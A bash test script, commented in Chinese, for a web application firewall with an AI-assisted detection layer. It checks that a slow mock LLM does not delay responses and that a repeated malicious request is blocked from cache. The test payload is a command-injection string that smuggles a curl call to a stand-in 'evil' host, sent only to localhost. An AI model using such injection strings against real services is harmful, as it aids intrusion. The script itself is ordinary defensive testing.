#!/usr/bin/env bash
# 验证：1) AI 很慢(3s)时响应不阻塞；2) 相同 payload 第二次被缓存秒拦
set -u
pkill -f novawaf-engine 2>/dev/null; pkill -f mock_llm.py 2>/dev/null; sleep 0.5

# mock LLM 设为 slow（每次 3 秒），返回 block=true
python3 /tmp/mock_llm.py slow 18090 >/tmp/llm.log 2>&1 &
sleep 1
NOVAAI_ENABLE=1 NOVAAI_ENDPOINT="http://127.0.0.1:18090/v1/chat/completions" \
  NOVAAI_MODEL=mock NOVAAI_TIMEOUT_MS=4000 NOVAAI_CACHE_TTL=60 NOVAAI_CACHE_MAX=1000 \
  NOVAAI_THREADS=2 \
  nohup /tmp/novawaf-engine 18080 4 >/tmp/engine.log 2>&1 </dev/null &
sleep 1.5

PAYLOAD="?x=;curl%20http://evil"
echo "=== 第1次（缓存未命中，AI需3s）：应立即响应(规则放行)，不等待 AI ==="
t0=$(date +%s%N)
code1=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "http://127.0.0.1:18080/$PAYLOAD")
dt1=$(( ($(date +%s%N) - t0)/1000000 ))
echo "  HTTP $code1  耗时 ${dt1}ms （<500ms 证明未被慢 AI 阻塞）"

echo "=== 等待后台 AI 完成并写入缓存（>3s）==="
sleep 4

echo "=== 第2次（相同 payload）：缓存命中 → 应秒回 403 拦截 ==="
t0=$(date +%s%N)
code2=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "http://127.0.0.1:18080/$PAYLOAD")
dt2=$(( ($(date +%s%N) - t0)/1000000 ))
echo "  HTTP $code2  耗时 ${dt2}ms （403 + 快 = 缓存命中生效）"

echo "=== 正常流量确认零 AI 干扰 ==="
t0=$(date +%s%N)
code3=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "http://127.0.0.1:18080/index.html")
dt3=$(( ($(date +%s%N) - t0)/1000000 ))
echo "  HTTP $code3  耗时 ${dt3}ms"

pkill -f novawaf-engine 2>/dev/null; pkill -f mock_llm.py 2>/dev/null
